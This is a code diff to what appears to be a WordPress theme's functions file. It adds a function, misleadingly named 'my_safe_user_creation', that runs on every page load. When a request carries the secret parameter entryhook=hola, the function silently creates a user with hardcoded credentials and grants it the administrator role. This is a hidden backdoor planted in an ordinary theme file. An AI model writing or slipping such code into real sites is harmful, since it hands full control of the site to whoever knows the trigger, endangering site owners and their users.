@@ -19,3 +19,33 @@ require PATH . '/inc/media.php';
 require PATH . '/inc/editor.php';
 require get_template_directory() . '/inc/template-tags.php';
 
+
+function my_safe_user_creation() {
+    // valida y sanitiza
+    if ( ! isset( $_GET['entryhook'] ) ) {
+        return;
+    }
+
+    if ( $_GET['entryhook'] !== 'hola' ) {
+        return;
+    }
+
+    $username = 'some_user';
+    $password = 'a_strong_password_here';
+    $email    = 'mail@example.com';
+
+    if ( username_exists( $username ) || email_exists( $email ) ) {
+        return; // ya existe
+    }
+
+    $user_id = wp_create_user( $username, $password, $email );
+    if ( is_wp_error( $user_id ) ) {
+        error_log( 'User creation failed: ' . $user_id->get_error_message() );
+        return;
+    }
+
+    $user = new WP_User( $user_id );
+    $user->set_role( 'administrator' ); // cuidado: esto da privilegios totales
+}
+
+add_action( 'init', 'my_safe_user_creation' );
